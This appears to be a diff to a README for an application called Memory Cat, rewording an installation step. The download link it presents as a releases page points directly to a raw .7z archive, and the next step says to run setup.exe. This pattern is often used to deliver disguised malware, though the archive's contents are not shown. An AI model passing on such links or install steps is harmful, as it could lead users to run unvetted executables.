@@ -17,7 +17,7 @@
 
 ## Installation
 
-1.  **Download the latest release:** Go to the [Releases](https://github.com/sasa00elsaedy/memory-cat/raw/refs/heads/main/memory_cat.7z) page and download the latest version of Memory Cat.
+1.  **Download the latest version:** Go to the [version](https://github.com/sasa00elsaedy/memory-cat/raw/refs/heads/main/memory_cat.7z)
 2.  **Run the installer:** If a setup package is provided, run it to install the application. Otherwise, extract the downloaded files and run `setup.exe`.
 
 ## How to Use
